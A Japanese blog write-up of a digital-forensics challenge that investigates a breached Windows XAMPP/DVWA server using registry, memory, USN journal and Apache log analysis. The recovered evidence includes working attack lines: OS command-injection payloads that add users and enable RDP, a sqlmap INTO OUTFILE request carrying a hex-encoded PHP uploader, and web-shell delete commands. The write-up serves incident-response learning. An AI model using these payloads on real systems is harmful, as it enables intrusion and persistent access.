---
date: 2018-02-05T03:21:46.0000000
draft: false
title: "Digital Forensic Challenge #1 - Web Server Case Write up"
tags: ["Forensics"]
---

※ 移行前の元ブログ記事 : [Digital Forensic Challenge #1 - Web Server Case Write up - #include <sys_socket.h>](https://socketo.hatenablog.jp/entry/2018/02/05/032146)

本投稿の内容に間違いや問題などありましたら，Twitter経由などでやんわり優しめに教えて頂ければ幸いです．(Twitter:[@sys_socket](https://twitter.com/sys_socket))

はい．

https://www.ashemery.com/dfir.html のChallenge #1

参考:

[Between Two DFIRns: Ashemery.com: Challenge #1 - Web Server Case Write-up](https://betweentwodfirns.blogspot.jp/2017/03/ashemerycom-challenge-1-web-server-case.html)

## 問題文

``` text
A company’s web server has been breached through their website. Our team arrived just in time to take a forensic image of the running system and its memory for further analysis. The files can be found below:

1. System Image
2. System Memory
3. Hashes:
4. Passwords

To successfully solve this challenge, a report with answers to the tasks below is required:

1.  What type of attacks has been performed on the box?
2.  How many users has the attacker(s) added to the box, and how were they added?
3.  What leftovers (files, tools, info, etc) did the attacker(s) leave behind? (assume our team arrived in time and the attacker(s) couldn’t clean and cover their tracks)
4.  What software has been installed on the box, and were they installed by the attacker(s) or not?
5.  Using memory forensics, can you identify the type of shellcode used?
6.  What is the timeline analysis for all events that happened on the box?
7.  What is your hypothesis for the case, and what is your approach in solving it?
8.  Is there anything else you would like to add?

**Bonus Question:** what are the directories and files, that have been added by the attacker(s)? List all with proof.
**Important Note:** do not use commercial tools for your own learning benefit.
```

稼働していたWebサービスのシステムディスクのイメージと，システムのメモリから侵害の様子を調査する．

調査する際に以下の項目を答えなけらばならない．

1.  どのような攻撃が行われたか？
2.  追加された攻撃者のユーザ数と，そのユーザがどのように追加されたのか？
3.  攻撃者が残したファイル，ツール，情報
4.  攻撃者によってインストールされたソフトウェア
5.  メモリダンプから使用したシェルコードの種類の特定
6.  発生したインシデントのタイムライン
7.  このインシデントの仮説とそのアプローチ
8.  その他追加


## 調査環境・ツール

* FTK(R) Imager 3.2.0 : http://marketing.accessdata.com/ftkimager3.2.0
* SIFT CLI : https://github.com/sans-dfir/sift-cli

    * RegRIpper : https://github.com/keydet89/RegRipper2.8
    * Volatility : https://github.com/volatilityfoundation/volatility

* USNAnalytics : https://www.kazamiya.net/usn_analytics

有償のツールを使うなということなので，X-waysやEnCaseやその他便利有償ツールとかは使わなんという感じで．

とりあえずダウンロードしたSystem ImageをFTK Imagerにマウントする．
![](https://i.imgur.com/vONMwUB.png)

出来そうなのでやる．

## 調査

### 基本情報を調べる

regripperを使用．使い方などはここに記載してあるので参考に．

[Windows Registry Forensics using ‘RegRipper’ Command-Line on Linux](http://resources.infosecinstitute.com/registry-forensics-regripper-command-line-linux/)

主要なレジストリハイブファイルは`%SYSTEMROOT%/System32/config/`にあるので`SAM`,`SECURITY`,`SOFTWARE`,`SYSTEM`をFTKImagerでExportする

各レジストリの説明などはここ
https://support.microsoft.com/ja-jp/help/256986/windows-registry-information-for-advanced-users

* OS情報
    Windowsのバージョンを確認

``` text
[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/reg]$ rip.pl -r SOFTWARE -p winver
Launching winver v.20081210
winver v.20081210
(Software) Get Windows version

ProductName = Windows Server (R) 2008 Standard
CSDVersion  = Service Pack 1
InstallDate = Mon Aug 24 06:52:43 2015
```

WindowsServer(R)2008 standard SP1と判明

* timezone
    timezoneの確認

``` text
[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/reg]$ rip.pl -r SYSTEM -p timezone
Launching timezone v.20160318
timezone v.20160318
(System) Get TimeZoneInformation key contents

TimeZoneInformation key
ControlSet001\Control\TimeZoneInformation
LastWrite Time Mon Aug 24 07:50:29 2015 (UTC)
DaylightName   -> @tzres.dll,-211
StandardName   -> @tzres.dll,-212
Bias           -> 480 (8 hours)
ActiveTimeBias -> 420 (7 hours)
TimeZoneKeyName-> Pacific Standard Time
```

タイムゾーンがPacific Standard TimeでUTC -8というのを確認

* ComputerName/Hostname
    コンピュータ名とホスト名を確認

``` text
[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/reg]$ rip.pl -r SYSTEM -p compname
Launching compname v.20090727
compname v.20090727
(System) Gets ComputerName and Hostname values from System hive

ComputerName    = WIN-L0ZZQ76PMUF
TCP/IP Hostname = WIN-L0ZZQ76PMUF
```

* User確認

``` text
[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/reg]$ rip.pl -r SAM -p samparse
Launching samparse v.20160203
samparse v.20160203
(SAM) Parse SAM file for user & group mbrshp info

User Information
-------------------------
Username        : Administrator [500]
Full Name       :
User Comment    : Built-in account for administering the computer/domain
Account Type    : Default Admin User
Account Created : Mon Aug 24 06:54:25 2015 Z
Name            :
Last Login Date : Sat Sep 12 18:19:18 2015 Z
Pwd Reset Date  : Mon Aug 24 06:59:37 2015 Z
Pwd Fail Date   : Wed Sep  2 09:00:39 2015 Z
Login Count     : 23
--> Normal user account

Username        : Guest [501]
Full Name       :
User Comment    : Built-in account for guest access to the computer/domain
Account Type    : Default Guest Acct
Account Created : Mon Aug 24 06:54:25 2015 Z
Name            :
Last Login Date : Never
Pwd Reset Date  : Never
Pwd Fail Date   : Never
Login Count     : 0
--> Password does not expire
--> Account Disabled
--> Password not required
--> Normal user account

Username        : user1 [1005]
Full Name       :
User Comment    :
Account Type    : Custom Limited Acct
Account Created : Wed Sep  2 09:05:06 2015 Z
Name            :
Last Login Date : Never
Pwd Reset Date  : Wed Sep  2 09:05:06 2015 Z
Pwd Fail Date   : Never
Login Count     : 0
--> Normal user account

Username        : hacker [1006]
Full Name       :
User Comment    :
Account Type    : Custom Limited Acct
Account Created : Wed Sep  2 09:05:25 2015 Z
Name            :
Last Login Date : Never
Pwd Reset Date  : Wed Sep  2 09:05:25 2015 Z
Pwd Fail Date   : Never
Login Count     : 0
--> Normal user account
```

イメージ上では以下画像のアカウントしか残っておらず，`user1 [1005]`, `hacker [1006]`は攻撃者が作った後に削除したユーザの様子．

![](https://i.imgur.com/8FLmLMo.png)

### USNジャーナルの解析

[JSAC2018](https://www.jpcert.or.jp/event/jsac2018.html)でkazamiyaさんが発表していたUSNAnalyticsを使っていきます．

余談ですが，JSAC2018聴講しに行ったのですが「これが本当に無料でいいんかい」というくらい充実した良いカンファレンスだったので来年以降もあったら参加したいですね．

https://www.kazamiya.net/usn_analytics

![](https://i.imgur.com/glv8duH.png)

UTCで出したのでこの端末のtimezoneとは−7時間違うので注意する

### 調査

rootディレクトリ直下に`xampp`ディレクトリがあるのでxamppが動いていた様子．

#### メモリダンプから調べる

Volatiltiyを使う．
大抵のVolatilityのコマンドはここを見れば分かるので参考．

[Command Reference · volatilityfoundation/volatility Wiki · GitHub](https://github.com/volatilityfoundation/volatility/wiki/Command-Reference)

少し前にアップデートされたSANS ForensicsのMemory Forensics Cheat Sheetも参考になる．

https://digital-forensics.sans.org/media/memory-forensics-cheat-sheet.pdf

とりあえずpstreeを調べる．

`xampp-control.exe`の下に`httpd.exe`と`FileZillaServer`と`mysqld.exe`がぶら下がって稼働していたことが分かる(一部省略)

``` text
[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/memory]$ vol.py -f memdump.mem --profile=Win2008SP1x86 pstree
Volatility Foundation Volatility Framework 2.6
Name                                                  Pid   PPid   Thds   Hnds Time
-------------------------------------------------- ------ ------ ------ ------ ----
. 0x83faa020:xampp-control.e                         2768    816      2    119 2015-08-23 10:32:17 UTC+0000
.. 0x83e4d7c0:httpd.exe                              2796   2768      1     92 2015-08-23 10:32:21 UTC+0000
... 0x83fd77a8:httpd.exe                             2880   2796    155    483 2015-08-23 10:32:26 UTC+0000
.. 0x83fd5200:FileZillaServer                        2856   2768      5     35 2015-08-23 10:32:25 UTC+0000
.. 0x83f9ec70:mysqld.exe                             2804   2768     23    570 2015-08-23 10:32:23 UTC+0000
```

ポート80, 443がhttpdによって開いていたことを確認

``` text
[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/memory]$ vol.py -f memdump.mem --profile=Win2008SP1x86 netscan | grep httpd.exe
Volatility Foundation Volatility Framework 2.6
0x3efccbe8         TCPv4    0.0.0.0:80                     0.0.0.0:0            LISTENING        2796     httpd.exe
0x3efccbe8         TCPv6    :::80                          :::0                 LISTENING        2796     httpd.exe
0x3efcde10         TCPv4    0.0.0.0:443                    0.0.0.0:0            LISTENING        2796     httpd.exe
0x3efcdeb8         TCPv4    0.0.0.0:443                    0.0.0.0:0            LISTENING        2796     httpd.exe
0x3efcdeb8         TCPv6    :::443                         :::0                 LISTENING        2796     httpd.exe
0x3efcdf60         TCPv4    0.0.0.0:80                     0.0.0.0:0            LISTENING        2796     httpd.exe
```

### Apache logの確認

Apacheが動いていたようなので，イメージ上からapcheのログを確認する．
`[root]/xampp/apache/logs`

![](https://i.imgur.com/nfBPoiG.png)

#### /dvwa/

SAMから分かった攻撃者と思われるユーザ，user11005], hacker[1006]のユーザ作成時間付近(2015/09/02 09:05:00([UTC))のaccess.logをとりあえず見る．

※timezoneを調べた際にUTC-7というのが分かったので検索としては-7時間した"2015/09/02 02:"を調べた
![](https://i.imgur.com/OT1IoKS.png)

``` text
[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/apache_logs]$ cat access.log| grep 02/Sep/2015:02
192.168.56.102 - - [02/Sep/2015:02:02:33 -0700] "POST /dvwa/vulnerabilities/exec/ HTTP/1.1" 200 4934 "http://192.168.56.101/dvwa/vulnerabilities/exec/" "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.0"
192.168.56.102 - - [02/Sep/2015:02:03:18 -0700] "POST /dvwa/vulnerabilities/exec/ HTTP/1.1" 200 4934 "http://192.168.56.101/dvwa/vulnerabilities/exec/" "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.0"
192.168.56.102 - - [02/Sep/2015:02:04:36 -0700] "POST /dvwa/vulnerabilities/exec/ HTTP/1.1" 200 4934 "http://192.168.56.101/dvwa/vulnerabilities/exec/" "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.0"
192.168.56.102 - - [02/Sep/2015:02:05:22 -0700] "POST /dvwa/vulnerabilities/exec/ HTTP/1.1" 200 4971 "http://192.168.56.101/dvwa/vulnerabilities/exec/" "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.0"
```

なにやら`/dvwa/vulnerabilities/exec/`へPOSTしていることが分かる．

dvwaを知らなかったのでggりましたが，Damn Vulnerable Web Applicationの略称で，Webアプリケーションセキュリティの教育などに使用されるものらしいです．
http://www.dvwa.co.uk/

/dvwa/vulnerabilities/exec/はIPを入力するとそこへのPingの結果を返すというもので,以下がそのPHPのコード

https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/exec/source/low.php

`$target`をそのまま受け取ってshell_execをしているんで`IPアドレス ; cat /etc/passwd`のような感じで任意のコマンドを実行可能で，このあたりでuser1の作成などをされたのではないかと推測

DVWAの/dvwa/vulnerabilities/exec/は以下のページで解説をしている

[Damn Vulnerable Web App (DVWA): Lesson 2: Command Execution Basic Testing](https://computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson2/index.html)

### 攻撃者のユーザ作成

volatilityのcmdscanプラグインを使用して攻撃者がcmd.exeから入力したコマンドを検出する．

``` text
[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/memory]$ vol.py -f memdump.mem --profile=Win2008SP1x86 cmdscan
Volatility Foundation Volatility Framework 2.6
**************************************************
CommandProcess: csrss.exe Pid: 524
CommandHistory: 0x5a24708 Application: cmd.exe Flags: Allocated, Reset
CommandCount: 17 LastAdded: 16 LastDisplayed: 16
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x2d8
Cmd #0 @ 0xe907c8: ipconfig
Cmd #1 @ 0xe91af8: cls
Cmd #2 @ 0xe91db0: ipconfig
Cmd #3 @ 0x5a34bd0: net user user1 user1 /add
Cmd #4 @ 0x5a34eb8: net user user1 root@psut /add
Cmd #5 @ 0x5a34c10: net user user1 Root@psut /add
Cmd #6 @ 0x5a24800: cls
Cmd #7 @ 0x5a34c58: net /?
Cmd #8 @ 0x5a34d88: net localgroup /?
Cmd #9 @ 0x5a34f48: net localgroup "Remote Desktop Users" user1 /add
Cmd #10 @ 0x5a34c70: net /?
Cmd #11 @ 0xe911b0: netsh /?
Cmd #12 @ 0xe907e8: netsh firewall /?
Cmd #13 @ 0xe91218: netsh firewall set service type = remotedesktop /?
Cmd #14 @ 0xe91288: netsh firewall set service type = remotedesktop enable
Cmd #15 @ 0xe91300: netsh firewall set service type=remotedesktop mode=enable
Cmd #16 @ 0xe91380: netsh firewall set service type=remotedesktop mode=enable scope=subnet
**************************************************
CommandProcess: csrss.exe Pid: 524
CommandHistory: 0x5a30950 Application: cmd.exe Flags: Allocated, Reset
CommandCount: 2 LastAdded: 1 LastDisplayed: 1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x7ec
Cmd #0 @ 0xe91970: netsh fireall set service type=remotedesktop mode=enable scope=subnet
Cmd #1 @ 0x5a17b58: netsh firewall set service type=remotedesktop mode=enable scope=subnet
Cmd #38 @ 0x5a30bc8:
Cmd #39 @ 0x5a24890: et.exe
Cmd #48 @ 0x5a24890: et.exe
Cmd #49 @ 0xe91af8: cls
**************************************************
CommandProcess: csrss.exe Pid: 524
CommandHistory: 0x5a30ad0 Application: httpd.exe Flags: Allocated
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x3bc
```

`net user`コマンドを使ってuser1を作成し，`Remote Desktop Users`ローカルグループに追加した後，Windows FireWallでRDPを有効にしていることが分かる．
/dvwa/vulnerabilities/execでOSコマンドインジェクションされて作成されたのかとか想像(仮定)

#### メモリイメージからStringsで見る

`user1`が`net user`コマンドを使って作成されたらしい．
もう一つのアカウント`hacker`が作られた形跡を探す．
メモリダンプからhttpd.exeのプロセス部分をダンプする

``` text
[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/memory]$ vol.py -f memdump.mem --profile=Win2008SP1x86 pslist | grep httpd.exe
Volatility Foundation Volatility Framework 2.6
0x83e4d7c0 httpd.exe              2796   2768      1       92      1      0 2015-08-23 10:32:21 UTC+0000
0x83fd77a8 httpd.exe              2880   2796    155      483      1      0 2015-08-23 10:32:26 UTC+0000
```

プロセスとして動いていたのはPID:2796と2880っぽい．
両方共memdumpする

2796

``` text
[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/memory]$ vol.py -f memdump.mem --profile=Win2008SP1x86 memdump -p 2796 -D 2796
Volatility Foundation Volatility Framework 2.6
************************************************************************
Writing httpd.exe [  2796] to 2796.dmp
```

2880

``` text
[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/memory]$ vol.py -f memdump.mem --profile=Win2008SP1x86 memdump -p 2880 -D 2880
Volatility Foundation Volatility Framework 2.6
************************************************************************
Writing httpd.exe [  2880] to 2880.dmp
```

メモリダンプから文字列を抜き出して，ユーザ名`hacker`で検索

2796

``` text
[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/memory/2796]$ strings 2796.dmp|grep hacker
~^webwhacker.*$~
WebWhacker*
WebWhacker*
WebWhacker
Zp6.102+%26%26+net+user+hacker+hacker+/add&submit=submit
ip=192.168.56.102+%26%26+net+localgroup+%22Remote+Desktop+Users%22+hacker+%2Fadd&submit=submit$
hackerLo
```

2880

``` text
[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/memory/2880]$ strings 2880.dmp|grep hacker
~^webwhacker.*$~
WebWhacker*
WebWhacker*
WebWhacker
<center><b>Owned by hacker</b></center>
<center><b>Owned by hacker</b></center>
<center><b>Owned by hacker</b></center>
<center><b>Owned by hacker</b></center>
<center><b>Owned by hacker</b></center>
Zp6.102+%26%26+net+user+hacker+hacker+/add&submit=submit
ip=192.168.56.102+%26%26+net+localgroup+%22Remote+Desktop+Users%22+hacker+%2Fadd&submit=submit$
hackerLo
```

両方共下2行で，`net user`コマンドでユーザ名`hacker`のユーザが作成され，Remote Desktopのローカルグループに追加されていることが分かる．

`ip=192.168.56.102%26%26`から始まっていることから，`/dvwa/vulnerabilities/exec/`のフォームからのOSコマンドインジェクションにより実行されたのでないかと推測．

[Between Two DFIRns: Ashemery.com: Challenge #1 - Web Server Case Write-up](https://betweentwodfirns.blogspot.jp/2017/03/ashemerycom-challenge-1-web-server-case.html)

参考にしたここを見たら，`%26%26`(URLdecodeすると&&)でgrepすると，`[IP]+&&+[cmd]`形式でプロセスメモリ上に残ったコマンドを検索することが出来るようで，なるほど～となった．

``` text
[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/memory/2880]$ strings 2880.dmp|grep %26%26
ip=192.168.56.102+%26%26+dir+C%3A%5Cwindows%5C&submit=submit_
P26.102+%26%26+dir+C%3A%5Cusers%5Cadministrator&submit=submit
Zp6.102+%26%26+net+user+hacker+hacker+/add&submit=submit
ip=192.168.56.102+%26%26+dir&submit=submit
ip=192.168.56.102+%26%26+net+localgroup+%22Remote+Desktop+Users%22+hacker+%2Fadd&submit=submit$
ip=192.168.56.102+%26%26%64%69%72&submit=submit?
```

### SQLinjection

access.logを見ていると，uaがsqlmapからのアクセスが大変に多い．
sqlmapはSQLinjectionのテストツール http://sqlmap.org/

#### `tmpukudk.php`と`tmpbiwuc.php`

``` text
[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/apache_logs]$ cat access.log|grep -e tmpukudk.php -e tmpbiwuc.php
192.168.56.102 - - [02/Sep/2015:04:25:52 -0700] "GET /dvwa/vulnerabilities/sqli/?id=2%27%20LIMIT%200%2C1%20INTO%20OUTFILE%20%27%2Fxampp%2Fhtdocs%2Ftmpukudk.php%27%20LINES%20TERMINATED%20BY%200x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d5c5c78616d70705c5c6874646f63735c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a--%20--%20&Submit=Submit HTTP/1.1" 200 4893 "-" "sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)"
192.168.56.102 - - [02/Sep/2015:04:25:52 -0700] "GET /xampp/htdocs/tmpukudk.php HTTP/1.1" 403 1206 "-" "sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)"
192.168.56.102 - - [02/Sep/2015:04:25:53 -0700] "GET /htdocs/tmpukudk.php HTTP/1.1" 404 1059 "-" "sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)"
192.168.56.102 - - [02/Sep/2015:04:25:53 -0700] "GET /tmpukudk.php HTTP/1.1" 200 315 "-" "sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)"
192.168.56.102 - - [02/Sep/2015:04:25:53 -0700] "POST /tmpukudk.php HTTP/1.1" 200 25 "-" "Python-urllib/2.7"
192.168.56.102 - - [02/Sep/2015:04:26:04 -0700] "GET /tmpbiwuc.php?cmd=dir HTTP/1.1" 200 853 "-" "sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)"
192.168.56.102 - - [02/Sep/2015:04:26:23 -0700] "GET /tmpbiwuc.php?cmd=del%20%2FF%20%2FQ%20C%3A%5Cxampp%5Chtdocs%5Ctmpukudk.php HTTP/1.1" 200 11 "-" "sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)"
192.168.56.102 - - [02/Sep/2015:04:26:23 -0700] "GET /tmpbiwuc.php?cmd=del%20%2FF%20%2FQ%20%5Cxampp%5Chtdocs%5Ctmpbiwuc.php HTTP/1.1" 200 11 "-" "sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)"
```

URLEncodeされてて微妙に見づらいのでDecodeする．
`INTO OUTFILE`で`/xampp/htdocs/tmpukudk.php`を作成していることが分かる．

``` text
192.168.56.102 - - [02/Sep/2015:04:25:52 -0700] "GET /dvwa/vulnerabilities/sqli/?id=2' LIMIT 0,1 INTO OUTFILE '/xampp/htdocs/tmpukudk.php' LINES TERMINATED BY 0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d5c5c78616d70705c5c6874646f63735c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a-- -- &Submit=Submit HTTP/1.1" 200 4893 "-" "sqlmap/1.0-dev-nongit-20150902 
```

Pythonのurllibを使って何かしらをPOST．その次に新しい`tmpbiwuc.php`に対して`cmd=echo command execution test`とリクエストを投げているので何かしらコマンドを受けて返すスクリプトを投げている様子．WebShellとかですかね．

``` text
192.168.56.102 - - [02/Sep/2015:04:25:53 -0700] "POST /tmpukudk.php HTTP/1.1" 200 25 "-" "Python-urllib/2.7"
192.168.56.102 - - [02/Sep/2015:04:25:53 -0700] "GET /tmpbiwuc.php?cmd=echo%20command%20execution%20test HTTP/1.1" 200 36 "-" "sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)"
```

その後は`tmpbiwuc.php`経由で`tmpukudk.php`と自身をdelコマンドで削除している．

#### 2

上と大体同じ

`tmpudvfh.php`をドロップして，`tmpbrjvl.php`をPython経由でアップロード，その後に削除．

URLDecode済み

``` text
[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/apache_logs]$ cat access.log|grep -e tmpudvfh.php -e tmpbrjvl.php
192.168.56.102 - - [02/Sep/2015:23:52:24 -0700] "GET /dvwa/vulnerabilities/sqli/?id=2' LIMIT 0,1 INTO OUTFILE '/xampp/htdocs/tmpudvfh.php' LINES TERMINATED BY 0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d5c5c78616d70705c5c6874646f63735c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a-- -- &Submit=Submit HTTP/1.1" 200 4893 "-" "sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)"
192.168.56.102 - - [02/Sep/2015:23:52:24 -0700] "GET /xampp/htdocs/tmpudvfh.php HTTP/1.1" 403 1206 "-" "sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)"
192.168.56.102 - - [02/Sep/2015:23:52:24 -0700] "GET /htdocs/tmpudvfh.php HTTP/1.1" 404 1059 "-" "sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)"
192.168.56.102 - - [02/Sep/2015:23:52:24 -0700] "GET /tmpudvfh.php HTTP/1.1" 200 315 "-" "sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)"
192.168.56.102 - - [02/Sep/2015:23:52:24 -0700] "POST /tmpudvfh.php HTTP/1.1" 200 25 "-" "Python-urllib/2.7"
192.168.56.102 - - [02/Sep/2015:23:52:24 -0700] "GET /tmpbrjvl.php?cmd=echo command execution test HTTP/1.1" 200 36 "-" "sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)"
192.168.56.102 - - [02/Sep/2015:23:59:38 -0700] "GET /tmpbrjvl.php?cmd=del /F /Q C:\xampp\htdocs\tmpudvfh.php HTTP/1.1" 200 11 "-" "sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)"
192.168.56.102 - - [02/Sep/2015:23:59:38 -0700] "GET /tmpbrjvl.php?cmd=del /F /Q \xampp\htdocs\tmpbrjvl.php HTTP/1.1" 200 11 "-" "sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)"
```

USNJrnlからも削除を確認することが出来る．UTCなので-7にする必要がある．

``` text
[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/usnjrnl]$ cat usn_analytics_records-20150903T065251.csv|grep .php
"22433888"      "1"     "2015/09/03 06:59:38.713027"    "0.000000"      "tmpudvfh.php"  "DELETE|CLOSE"  "ARCHIVE"       "60478" "42732" ""
"22433976"      "1"     "2015/09/03 06:59:38.822402"    "0.000000"      "tmpbrjvl.php"  "DELETE|CLOSE"  "ARCHIVE"       "62328" "42732" ""
```

### LocalFileInclude

ディレクトリトラバーサル攻撃とローカルファイルインクルード攻撃の区別が個人的についていなかったので，以下のブログを参考にさせていただきました．

[ディレクトリ・トラバーサルとファイルインクルードとの違い - Web Application Security Memo](https://www.pupha.net/archives/1322/)

今回はLFIで良さそう．

`/dvwa/vulnerabilities/fi`のディレクトリ名的にもFileIncludeを想定していそう．

![](https://i.imgur.com/kA4XOOm.png)

何回も行われているが，読み込まれているファイルとしては以下のものの様子．
- C:/Windows/System32/drivers/etc/hosts
- DNSより参照されるIPアドレスとドメイン名の一覧などのファイル
- C:/users/administrator/data.txt
- ![](https://i.imgur.com/71MCrLI.png)
- 作成日時や内容的に攻撃者が作成したテストファイルのように見える
- C:/xampp/phpMyAdmin/config.inc
- phpMyAdminの設定ファイルっぽいが，config.inc.phpはあるがこの名前のファイルは無いので，apacheのerror.logでFile not foundのエラーが返される

``` text
File not found - config.inc
File not found - config.inc
[Wed Sep 02 04:25:52.991836 2015] [authz_core:error] [pid 2880:tid 1564] [client 192.168.56.102:51858] AH01630: client denied by server configuration: C:/xampp/htdocs/xampp/htdocs
[Wed Sep 02 23:52:24.494277 2015] [authz_core:error] [pid 2880:tid 1596] [client 192.168.56.102:51904] AH01630: client denied by server configuration: C:/xampp/htdocs/xampp/htdocs
```

* abc.txt

    * ?
    * USNJrnlを見ると`abc`というフォルダが作成されているが関係あるのかどうか

``` text
[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/usnjrnl]$ cat usn_analytics_records-20150903T065251.csv | grep abc
"22799776"      "2"     "2015/09/03 07:17:58.338027"    "0.000000"      "abc\"  "CREATE|CLOSE"  "FOLDER"        "62335" "60268" ""
```

#### PHPのログを見る

`/xampp/php/php.ini`で設定ファイルを確認．

エラーログはここあるらしい．`error_log="C:\xampp\php\logs\php_error_log"`

ログ中に`Europe/Berlin`とあり，timezoneが違うようなので，おそらくUTC+1したものとなる．

include()する際，開くことが出来なかったファイルパスを確認することが出来る．
![](https://i.imgur.com/oYyNWrT.png)

### WebShell

USNJrnlを見ているとWebShellっぽいものが作成されていることを確認することが出来る．
webshells.zipの中身は`c99.php`，`webshell.php`の様子．

``` text
